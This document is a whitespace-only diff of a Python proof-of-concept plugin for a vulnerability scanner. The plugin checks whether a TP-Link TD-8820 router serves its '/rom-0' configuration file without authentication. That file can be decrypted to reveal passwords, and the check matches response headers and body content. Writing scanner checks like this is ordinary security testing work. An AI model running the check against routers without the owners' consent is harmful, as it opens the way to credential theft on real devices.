@@ -6,11 +6,12 @@ import urlparse
 import time
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'TP-Link_0001' # 平台漏洞编号，留空
+    vuln_id = 'TP-Link_0001'  # 平台漏洞编号，留空
     name = 'TP-Link 信息泄露'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INFO_LEAK # 漏洞类型
+    type = VulnType.INFO_LEAK  # 漏洞类型
     disclosure_date = '2014-09-15'  # 漏洞公布时间
     desc = '''  
         TP-ink TD-8820路由器未授权下载配置文件可解密。
@@ -20,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'TP-Link'  # 漏洞应用名称
     product_version = 'TD-8820'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'ddbf75a9-ceb2-4812-b356-130afafa387c'
@@ -33,7 +35,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             """
             POC Name  :  TP-link TD-8820 配置文件下载 可获得密码
             Author    :  a
@@ -43,9 +45,9 @@ class Poc(ABPoc):
             hh = hackhttp.hackhttp()
             p = '/rom-0'
             url = self.target + p
-            code, head,res, errcode, _ = hh.http(url)
+            code, head, res, errcode, _ = hh.http(url)
 
-            if code ==200 and 'application/octet-stream' in head and 'UPnP' in head and 'ether driver etherppp' in res:
+            if code == 200 and 'application/octet-stream' in head and 'UPnP' in head and 'ether driver etherppp' in res:
                 #security_hole(url + '    config file can be download')
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -55,6 +57,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
